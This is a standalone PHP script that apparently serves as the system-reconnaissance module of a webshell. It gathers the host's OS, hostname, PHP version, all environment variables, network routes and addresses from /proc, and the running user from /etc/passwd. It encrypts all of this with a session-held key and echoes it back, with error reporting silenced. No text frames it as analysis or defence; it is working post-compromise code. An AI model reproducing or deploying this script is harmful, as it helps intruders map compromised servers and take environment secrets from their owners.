
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return ($s0 == $str) ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}

function ipHex2Int($ipHex)
{
    return hexdec(substr($ipHex, 6, 2) . substr($ipHex, 4, 2) . substr($ipHex, 2, 2) . substr($ipHex, 0, 2));
}

function getIPv4()
{
    $netInfoList = array();
    $devFile = explode(":", trim(file_get_contents("/proc/net/dev")));
    for ($i = 0; $i < count($devFile) - 1; $i++) {
        $dev = explode("\n", $devFile[$i]);
        $netInfoList[trim(end($dev))] = array();
    }
    $routeFile = explode("\n", trim(file_get_contents("/proc/net/route")));
    for ($i = 1; $i < count($routeFile); $i++) {
        $route = explode("\t", $routeFile[$i]);
        if ($route[1] == "00000000")
            $netInfoList[trim($route[0])]["Gateway"] = long2ip(ipHex2Int($route[2]));
        if ($route[1] != "0000FEA9" && $route[2] == "00000000" && $route[7] != "FFFFFFFF") {
            $netInfoList[trim($route[0])]["Net"] = long2ip(ipHex2Int($route[1]));
            $netInfoList[trim($route[0])]["Mask"] = long2ip(ipHex2Int($route[7]));
        }
    }
    $fibFile = explode("/32 host", trim(explode("Local:", file_get_contents("/proc/net/fib_trie"))[1]));
    for ($i = 0; $i < count($fibFile) - 1; $i++) {
        $ip = trim(end(explode("|-- ", $fibFile[$i])));
        foreach ($netInfoList as $key => $netInfo) {
            if (empty($netInfo)) {
                unset($netInfoList[$key]);
            }
            if (isset($netInfo["Mask"]) && (ip2long($ip) & ip2long($netInfo["Mask"])) == ip2long($netInfo["Net"]))
                $netInfoList[$key]["ip"] = $ip;
        }
    }
    return $netInfoList;
}

function getUser(){
    $status = file_get_contents("/proc/self/status");
    $status = explode("Uid:", $status)[1];
    $uid = intval(explode("\t", trim($status))[0]);

    $passwd = file_get_contents("/etc/passwd");
    $users = explode("\n", $passwd);
    foreach ($users as $user) {
        $user = explode(":", $user);
        if ($uid === intval($user[2]) )
            return $user[0];
    }
}
error_reporting(0);
$k = $_SESSION['key'];
session_write_close();

$data = array(
    "os" => php_uname("s"),
    "host" => php_uname("n"),
    "phpVersion" => phpversion(),
    "env" => getenv(),
    "ipInfo" => "",
    "driveList" => ["/"],
    "user"=> getUser(),
    "currentPath" => getSafeStr(__DIR__)
);
foreach (getIPv4() as $key => $value) {
    $data["ipInfo"] .= "$key:\n    IP: ${value['ip']}\n    Net: ${value['Net']}\n    Mask: ${value['Mask']}\n    Gateway: ${value['Gateway']}\n";
}

echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $k);
